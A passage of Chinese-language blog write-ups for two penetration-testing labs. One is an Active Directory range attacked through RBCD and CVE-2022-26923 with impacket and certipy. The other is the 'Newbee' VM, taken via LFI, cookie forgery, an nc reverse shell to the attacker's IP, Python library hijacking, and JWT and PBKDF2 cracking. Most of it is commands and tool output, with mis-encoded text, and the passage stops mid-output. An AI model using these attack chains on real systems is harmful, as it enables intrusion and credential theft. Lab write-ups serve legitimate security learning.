Found 1 ousINFO: Found 19 containersINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: XR-CA.xiaorang.labINFO: Querying computer: XR-0687.xiaorang.labINFO: Querying computer: XR-DC01.xiaorang.labINFO: Done in 00M 05SINFO: Compressing output into 20250402040344_bloodhound.zip åŸŸç”¨æˆ· LIXIUYING å¯¹è®¡ç®—æœº XR-0687$ å…·æœ‰ Generic Write æƒé™ å¯ä»¥é€šè¿‡ä¿®æ”¹ç›®æ ‡çš„ msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§ï¼ˆé…ç½® RBCDï¼‰è·å–ç›®æ ‡ SYSTEM æƒé™ã€‚ æ·»åŠ ä¸€ä¸ªæœºå™¨ç”¨æˆ· 12345â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-addcomputer -computer-name &#x27;EVILCOMPUTER$&#x27; -computer-pass &#x27;123@#ABC&#x27; -dc-host XR-DC01.xiaorang.lab -dc-ip 172.22.15.13 &quot; xiaorang.lab/lixiuying: winniethepooh &quot;Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Successfully added machine account EVILCOMPUTER$ with password 123@#ABC. ç„¶åé…ç½® RBCDï¼š 123456789â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-rbcd xiaorang.lab/lixiuying: winniethepooh -action write -delegate-from &quot;EVILCOMPUTER $&quot; -delegate-to &quot;XR-0687$&quot; -dc-ip 172.22.15.13Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty[*] Delegation rights modified successfully![*] EVILCOMPUTER $ can now impersonate users on XR-0687$ via S4U2Proxy[*] Accounts allowed to act on behalf of other identity:[*] EVILCOMPUTER$ (S-1-5-21-3745972894-1678056601-2622918667-1147) è¯·æ±‚å¹¶å†’å……åŸŸç®¡æƒé™çš„æœåŠ¡ç¥¨æ®ï¼š 123456789101112131415161718â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-getST xiaorang.lab/EVILCOMPUTER$:&#x27;123@#ABC&#x27; -spn cifs/XR-0687.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[-] CCache file is not found. Skipping...[*] Getting TGT for user[*] Impersonating Administrator/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1)[*] Requesting S4U2self/usr/share/doc/python3-impacket/examples/getST.py:607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py:659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1)[*] Requesting S4U2Proxy[*] Saving ticket in Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccache 123456789101112131415161718â”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# export KRB5CCNAME = Administrator@cifs_XR-0687.xiaorang.lab@XIAORANG.LAB.ccacheâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-psexec &#x27;xiaorang.lab/administrator@XR-0687.xiaorang.lab&#x27; -target-ip 172.22.15.35 -codec gbk -no-pass -kImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 172.22.15.35.....[*] Found writable share ADMIN$[*] Uploading file RHzxEZPZ.exe[*] Opening SVCManager on 172.22.15.35.....[*] Creating service etRo on 172.22.15.35.....[*] Starting service etRo.....[!] Press help for extra shell commandsMicrosoft Windows [ç‰ˆæœ¬ 10.0.20348.1668](c) Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚C:\\Windows\\system32 &gt; flag03 åœ¨ C:\\users\\Administrator\\flag\\ ä¸»æœº 172.22.15.18 (XR-CA) å­˜åœ¨ CVE-2022-26923 æ¼æ´ æ‰“ CVE-2022â€“26923 æŸ¥æ‰¾è¯ä¹¦æœåŠ¡å™¨ï¼Œå¹¶å°è¯•æŸ¥æ‰¾å¯ä»¥åˆ©ç”¨çš„è¯ä¹¦æ¨¡æ¿ï¼š 1234567891011121314151617181920212223242526272829â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# certipy-ad find -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -vulnerable -stdoutCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Finding certificate templates[*] Found 34 certificate templates[*] Finding certificate authorities[*] Found 1 certificate authority[*] Found 12 enabled certificate templates[*] Trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via CSRA[!] Got error while trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via CSRA: Could not connect: [Errno 111] Connection refused[*] Trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via RRP[!] Got error while trying to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27; via RRP: [Errno Connection error (224.0.0.1:445)] [Errno 111] Connection refused[!] Failed to get CA configuration for &#x27;xiaorang-XR-CA-CA&#x27;[*] Enumeration output:Certificate Authorities 0 CA Name : xiaorang-XR-CA-CA DNS Name : XR-CA.xiaorang.lab Certificate Subject : CN = xiaorang-XR-CA-CA, DC = xiaorang, DC = lab Certificate Serial Number : 3ECFB0112E93BE9041059FA6DBB3C35A Certificate Validity Start : 2023-06-03 07:19:59+00:00 Certificate Validity End : 2028-06-03 07:29:58+00:00 Web Enrollment : Disabled User Specified SAN : Unknown Request Disposition : Unknown Enforce Encryption for Requests : UnknownCertificate Templates : [!] Could not find any certificate templates ä½¿ç”¨ certipy åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¹¶å°†è¯¥æœºå™¨è´¦æˆ· dNSHostName å±æ€§æŒ‡å‘åŸŸæ§ï¼š 12345678910111213â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# certipy-ad account create -u lixiuying@xiaorang.lab -p winniethepooh -dc-ip 172.22.15.13 -user &#x27;EVILCOMPUTER2$&#x27; -pass &#x27;123@#ABC&#x27; -dns &#x27;XR-DC01.xiaorang.lab&#x27;Certipy v4.8.2 - by Oliver Lyak (ly4k)[*] Creating new account: sAMAccountName : EVILCOMPUTER2$ unicodePwd : 123@#ABC userAccountControl : 4096 servicePrincipalName : HOST/EVILCOMPUTER2 RestrictedKrbHost/EVILCOMPUTER2 dnsHostName : XR-DC01.xiaorang.lab[*] Successfully created account &#x27;EVILCOMPUTER2$&#x27; with password &#x27;123@#ABC&#x27; ä½¿ç”¨è¯¥æœºå™¨è´¦æˆ·å‘ AD CS æœåŠ¡å™¨è¯·æ±‚åŸŸæ§æœºå™¨çš„è¯ä¹¦æ¨¡æ¿ï¼š 12345678910â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# certipy-ad req -u EVILCOMPUTER2\\$@xiaorang.lab -p &#x27;123@#ABC&#x27; -target 172.22.15.18 -ca &quot;xiaorang-XR-CA-CA&quot; -template MachineCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Requesting certificate via RPC[*] Successfully requested certificate[*] Request ID is 7[*] Got certificate with DNS Host Name &#x27;XR-DC01.xiaorang.lab&#x27;[*] Certificate has no object SID[*] Saved certificate and private key to &#x27;xr-dc01.pfx&#x27; ç”¨ç”³è¯·åˆ°çš„è¯ä¹¦ï¼Œç”³è¯·åŸŸæ§çš„ TGTï¼š 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# certipy-ad auth -pfx xr-dc01.pfx -dc-ip 172.22.15.13 -debugCertipy v4.8.2 - by Oliver Lyak (ly4k)[*] Using principal: xr-dc01$@xiaorang.lab[*] Trying to get TGT...[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) ä½¿ç”¨ certipy è¯·æ±‚ TGT å¤±è´¥ï¼Œå‡ºç° KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) é”™è¯¯ã€‚ bloodyAD ä½¿ç”¨è¯ä¹¦è¿›è¡Œè®¤è¯ï¼Œé…ç½® RBCD è¿›è¡Œæ”»å‡»ï¼š 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# certipy-ad cert -pfx xr-dc01.pfx &gt; xr-dc01.pemCertipy v4.8.2 - by Oliver Lyak (ly4k)â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# bloodyAD -d xiaorang.lab -u &#x27;EVILCOMPUTER2 $&#x27; -c &#x27;:xr-dc01.pem&#x27; --host 172.22.15.13 --secure add rbcd &#x27;xr-dc01$&#x27; &#x27;EVILCOMPUTER2$&#x27;[!] No security descriptor has been returned, a new one will be created[+] EVILCOMPUTER2 $ can now impersonate users on xr-dc01$ via S4U2Proxy è¯·æ±‚å¹¶å†’å……åŸŸç®¡æƒé™çš„æœåŠ¡ç¥¨æ®ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-getST &#x27;xiaorang.lab/EVILCOMPUTER2$: 123@#ABC&#x27; -spn LDAP/xr-dc01.xiaorang.lab -impersonate Administrator -dc-ip 172.22.15.13Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Getting TGT for user[*] Impersonating Administrator/usr/share/doc/python3-impacket/examples/getST.py: 380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py: 477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)[*] Requesting S4U2self/usr/share/doc/python3-impacket/examples/getST.py: 607: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow()/usr/share/doc/python3-impacket/examples/getST.py: 659: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)[*] Requesting S4U2Proxy[*] Saving ticket in Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccacheâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# export KRB5CCNAME = Administrator@LDAP_xr-dc01.xiaorang.lab@XIAORANG.LAB.ccacheDCSync ä»åŸŸæ§å¯¼å‡ºå‡­æ®ï¼šâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-secretsdump &#x27;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#x27; -target-ip 172.22.15.13 -no-pass -k -just-dc-user AdministratorImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Dumping Domain Credentials (domain\\uid: rid: lmhash: nthash)[*] Using the DRSUAPI method to get NTDS.DIT secrets[-] &#x27;NoneType&#x27; object has no attribute &#x27;getRemoteHost&#x27;[*] Something went wrong with the DRSUAPI approach. Try again with -use-vss parameter[*] Cleaning up...PTH ç™»å½•åŸŸæ§ï¼šâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# impacket-psexec &#x27;xiaorang.lab/administrator@XR-DC01.xiaorang.lab&#x27; -target-ip 172.22.15.13 -codec gbk -no-pass -kImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies[*] Requesting shares on 172.22.15.13.....[*] Found writable share ADMIN$[*] Uploading file FavsxEaA.exe[*] Opening SVCManager on 172.22.15.13.....[*] Creating service fjnA on 172.22.15.13.....[*] Starting service fjnA.....[!] Press help for extra shell commandsMicrosoft Windows [ç‰ˆæœ¬ 10.0.14393](c) 2016 Microsoft Corporationã€‚ä¿ç•™æ‰€æœ‰æƒåˆ©ã€‚C:\\windows\\system32 &gt; flag åœ¨ C:\\Users\\Administrator\\flag ä¸‹ å‚è€ƒhttps://h0ny.github.io/posts/2022%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B%E5%A4%8D%E7%9B%98-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/#as-rep-roasting https://x1nri.github.io/2025/01/24/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-2022%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3/","categories":[{"name":"æ˜¥ç§‹äº‘é•œ","slug":"æ˜¥ç§‹äº‘é•œ","permalink":"https://lvzhouhang.xyz/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"Hackmyvm-Newbee","slug":"Hackmyvm-Newbee","date":"2025-03-26T12:10:10.000Z","updated":"2025-04-19T13:25:36.809Z","comments":true,"path":"2025/03/26/Hackmyvm-Newbee/","permalink":"https://lvzhouhang.xyz/2025/03/26/Hackmyvm-Newbee/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -l 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:f5:b9:af PCS Systemtechnik GmbH192.168.31.122 00:0c:29:71:20:21 VMware, Inc.3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.384 seconds (107.38 hosts/sec). 3 responded 192.168.31.122å°±æ˜¯ipåœ°å€ nmap 192.168.31.122 -p-æ‰«æç«¯å£ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.122 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-26 08:21 EDTNmap scan report for 192.168.31.122Host is up (0.00090s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 00:0C:29:71:20:21 (VMware)Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds 80ç«¯å£æŸ¥çœ‹é¡µé¢æºç ï¼Œåœ¨æœ€ä¸‹é¢å¯ä»¥å‘ç°æœ‰ä¸€ä¸ª 1&lt;!--Wrong paramter to GET--&gt; å¯¹getå‚æ•°è¿›è¡Œfuzz 12345678910111213141516â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u &quot;http://192.168.31.122?FUZZ=/etc/passwd&quot; --hh 18851 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://192.168.31.122?FUZZ=/etc/passwd/Total requests: 220559=====================================================================ID Response Lines Word Chars Payload=====================================================================000001799: 200 376 L 1270 W 18863 Ch &quot;hack&quot; èƒ½fuzzå‡ºæ¥å‚æ•°åä¸ºhackï¼Œä½†æ˜¯é¡µé¢æœ€ä¸‹æ–¹è¿˜æ˜¯ä¼šæŠ¥é”™ 1&lt;!-- include failed try another file --&gt; å°è¯•åŒ…å«å…¶ä»–æ–‡ä»¶ æ‰«æç›®å½•å¯ä»¥æ‰«æåˆ°ä¸€ä¸ªsecret.php 1234567891011121314151617181920212223242526272829303132â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.122/&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.122/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: php,txt[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.php (Status: 403) [Size: 279]/index.php (Status: 200) [Size: 18852]/contact.php (Status: 200) [Size: 8853]/about.php (Status: 200) [Size: 10036]/blog.php (Status: 200) [Size: 9782]/products.php (Status: 200) [Size: 12163]/terms.php (Status: 200) [Size: 6670]/assets (Status: 301) [Size: 317] [--&gt; http://192.168.31.122/assets/]/testimonials.php (Status: 200) [Size: 7907]/javascript (Status: 301) [Size: 321] [--&gt; http://192.168.31.122/javascript/]/checkout.php (Status: 200) [Size: 13307]/secret.php (Status: 200) [Size: 2187]/.php (Status: 403) [Size: 279]/server-status (Status: 403) [Size: 279] secret.phpå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯å¿…é¡»è¦å…ˆè¿›è¡Œèº«ä»½éªŒè¯ï¼Œç”¨lfiåŒ…å«secret.phpè¯•è¯• 1http://192.168.31.122/?hack=php://filter/convert.base64-encode/resource=secret.php å¯ä»¥åŒ…å«å‡ºæ¥ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#secret.php&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;å‘½ä»¤è¡Œæ§åˆ¶å°&lt;/title&gt; &lt;style&gt; body &#123; background-color: #1e1e1e; font-family: Consolas, monospace; color: #fff; margin: 0; padding: 0; &#125; .console &#123; width: 80%; margin: 50px auto; padding: 20px; background-color: #000; border-radius: 8px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5); height: 400px; overflow-y: auto; font-size: 16px; &#125; .output &#123; white-space: pre-wrap; margin-bottom: 10px; &#125; .input-container &#123; display: flex; align-items: center; &#125; .input-container .prompt &#123; color: #00ff00; margin-right: 5px; &#125; .input-container input &#123; background: transparent; border: none; color: #fff; width: 100%; padding: 5px; font-size: 16px; outline: none; &#125; .input-container input:focus &#123; border: 1px solid #00ff00; &#125; .input-container input::placeholder &#123; color: #888; &#125; .console-footer &#123; padding-top: 10px; color: #888; font-size: 12px; text-align: center; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;console&quot;&gt; &lt;div class=&quot;output&quot; id=&quot;output&quot;&gt; &lt;?php if (isset($_COOKIE[&#x27;AreYouAdmin&#x27;]) &amp;&amp; $_COOKIE[&#x27;AreYouAdmin&#x27;] === &#x27;Yes&#x27;) &#123; if (isset($_GET[&#x27;command&#x27;])) &#123; $command = $_GET[&#x27;command&#x27;]; $output = shell_exec($command); echo &#x27;&lt;div&gt;\\&gt; &#x27; . htmlspecialchars($command) . &#x27;&lt;/div&gt;&#x27;; echo &#x27;&lt;div&gt;&#x27; . nl2br(htmlspecialchars($output)) . &#x27;&lt;/div&gt;&#x27;; &#125; &#125; else &#123; echo &#x27;&lt;div&gt;No permission to execute commands, lacking admin permission.&lt;/div&gt;&#x27;; &#125; ?&gt; &lt;/div&gt; &lt;div class=&quot;input-container&quot;&gt; &lt;span class=&quot;prompt&quot;&gt;\\&gt;&lt;/span&gt; &lt;form method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;command&quot; id=&quot;input&quot; placeholder=&quot;command...&quot; autocomplete=&quot;off&quot;&gt; &lt;/form&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt; const inputField = document.getElementById(&quot;input&quot;); inputField.focus();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; ä¼ªé€ cookie 1Cookie: AreYouAdmin=yes ç„¶ååå¼¹shell 12nc -e /bin/bash 192.168.31.129 4444script -qc /bin/bash /dev/null #è·å¾—äº¤äº’å¼shell ææƒ123456789www-data@Newbee:/var/www/html/shop$ sudo -lsudo: unable to resolve host Newbee: Temporary failure in name resolutionMatching Defaults entries for www-data on Newbee: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, targetpw, use_ptyUser www-data may run the following commands on Newbee: (debian) NOPASSWD: /usr/bin/python3 /var/www/html/vuln.py 1234567891011121314151617181920212223242526272829303132333435363738#vuln.pyimport randomimport timeimport mathimport stringimport datetimedef generate_random_string(length=10): return &#x27;&#x27;.join(random.choices(string.ascii_letters + string.digits, k=length))def pointless_computation(): number = random.randint(1, 1000) result = math.sqrt(number) * math.log(number) print(f&quot;Calculated math nonsense: sqrt(&#123;number&#125;) * log(&#123;number&#125;) = &#123;result&#125;&quot;)def simulate_time_wasting(): now = datetime.datetime.now() print(f&quot;Started wasting time at &#123;now&#125;&quot;) time.sleep(2) # æ•…æ„ç¡çœ  2 ç§’ later = datetime.datetime.now() print(f&quot;Finished wasting time at &#123;later&#125;. Time wasted: &#123;later - now&#125;&quot;)def pointless_string_operations(): rand_str = generate_random_string() print(f&quot;Generated random string: &#123;rand_str&#125;&quot;) reversed_str = rand_str[::-1] print(f&quot;Reversed string: &#123;reversed_str&#125;&quot;) print(f&quot;String length: &#123;len(rand_str)&#125;&quot;)if __name__ == &quot;__main__&quot;: pointless_computation() simulate_time_wasting() pointless_string_operations() print(&quot;All done. The script accomplished nothing useful.&quot;) å¯ä»¥åœ¨/var/www/htmlç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªrandom.pyæ–‡ä»¶è¿›è¡ŒåŠ«æŒï¼Œpythonæ–‡ä»¶ä¼šä¼˜å…ˆåŠ è½½å½“å‰ç›®å½•ä¸‹çš„åº“ 123#random.pyimport osos.system(&quot;bash -p&quot;) 12www-data@Newbee:/var/www/html$ sudo -u debian /usr/bin/python3 /var/www/html/vuln.pydebian@Newbee:/var/www/html$ æåˆ°debianç”¨æˆ·äº†ï¼Œhomeç›®å½•ä¸‹æœ‰ä¸€ä¸ªnote.txtå’Œä¸€ä¸ªconfig.php 12debian@Newbee:~$ cat note.txtDamn it, I forgot my database password. I heard that Debian is currently building a message board, maybe he can help me 1234567891011debian@Newbee:~$ cat config.php&lt;?php$servername = &quot;localhost&quot;;$username = &quot;root&quot;;$password = &quot;$conn = new mysqli($servername, $username, $password);........................ è¦æ‹¿åˆ°æ•°æ®åº“çš„å¯†ç  æŸ¥çœ‹ç«¯å£ 12345678debian@Newbee:~$ ss -lntupNetid State Recv-Q Send-Q Local Address:Port Peer Address:Port Processudp UNCONN 0 0 0.0.0.0:68 0.0.0.0:*tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*tcp LISTEN 0 128 127.0.0.1:5000 0.0.0.0:*tcp LISTEN 0 128 [::]:22 [::]:*tcp LISTEN 0 511 *:80 *:* å¯ä»¥å‘ç°æœ¬åœ°æœ‰5000ç«¯å£ï¼Œç”¨socatå°†5000ç«¯å£è½¬å‘å‡ºå» 1debian@Newbee:~$ socat TCP-LISTEN:5001,fork TCP4:127.0.0.1:5000 æ˜¯ä¸€ä¸ªç•™è¨€æ¿ï¼Œç™»å½•å¤„é™¤äº†adminï¼Œå…¶ä»–çš„éƒ½å¯ä»¥éšæ„ç™»å½•ï¼Œcookieé‡Œæœ‰ä¸€ä¸ªjwtï¼Œå¯ä»¥çŒœæµ‹æ˜¯jwtä¼ªé€  å¯ä»¥ç”¨hashcatçˆ†ç ´ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# hashcat -a 0 -m 16500 ./1 /usr/share/wordlists/rockyou.txthashcat (v6.2.6) startingOpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]============================================================================================================================================* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCUMinimum password length supported by kernel: 0Maximum password length supported by kernel: 256Hashes: 1 digests; 1 unique digests, 1 unique saltsBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotatesRules: 1Optimizers applied:* Zero-Byte* Not-Iterated* Single-Hash* Single-SaltWatchdog: Temperature abort trigger set to 90cHost memory required for this attack: 2 MBDictionary cache hit:* Filename..: /usr/share/wordlists/rockyou.txt* Passwords.: 14344385* Bytes.....: 139921507* Keyspace..: 14344385eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMzEyMyIsImV4cCI6MTc0MzAyNTM4OH0.qTMF9XS0BYo7nKIDg9rFr1qmUfR4btXsLS7GZv2QVW4:noobSession..........: hashcatStatus...........: CrackedHash.Mode........: 16500 (JWT (JSON Web Token))Hash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZS...v2QVW4Time.Started.....: Wed Mar 26 08:44:45 2025 (3 secs)Time.Estimated...: Wed Mar 26 08:44:48 2025 (0 secs)Kernel.Feature...: Pure KernelGuess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........: 2052.7 kH/s (0.87ms) @ Accel:512 Loops:1 Thr:1 Vec:8Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)Progress.........: 5025792/14344385 (35.04%)Rejected.........: 0/5025792 (0.00%)Restore.Point....: 5021696/14344385 (35.01%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidate.Engine.: Device GeneratorCandidates.#1....: noobface888 -&gt; nona1807Hardware.Mon.#1..: Util: 44%Started: Wed Mar 26 08:44:44 2025Stopped: Wed Mar 26 08:44:49 2025 noobå°±æ˜¯å¯†é’¥ï¼Œç”¨æˆ·åä¼ªé€ æˆadminï¼Œå¯ä»¥çœ‹åˆ°ç•™è¨€æ¿çš„å†…å®¹ 1234567891011121314debian@Newbee:~$ mysql -uroot -pTheStrongestPasswordHYHcreatedWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 5Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.No entry for terminal type &quot;unknown&quot;;using dumb terminal settings.No entry for terminal type &quot;unknown&quot;;using dumb terminal settings.Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.MariaDB [(none)]&gt; useråº“çš„userè¡¨é‡Œæœ‰debiançš„å¯†ç  123456789Database changedMariaDB [user]&gt; select * from user;+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+| id | username | passwd | salt | passwd_hash_algo |+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+| 1 | debian | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60 |+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+1 row in set (0.001 sec) pbdf2çˆ†ç ´å‚è€ƒhttps://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256 12345678910111213141516171819202122232425262728293031323334353637â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat 2sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHAâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# hashcat -a 0 ./2 /usr/share/wordlists/rockyou.txthashcat (v6.2.6) starting in autodetect modeOpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]============================================================================================================================================* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCUHash-mode was not specified with -m. Attempting to auto-detect 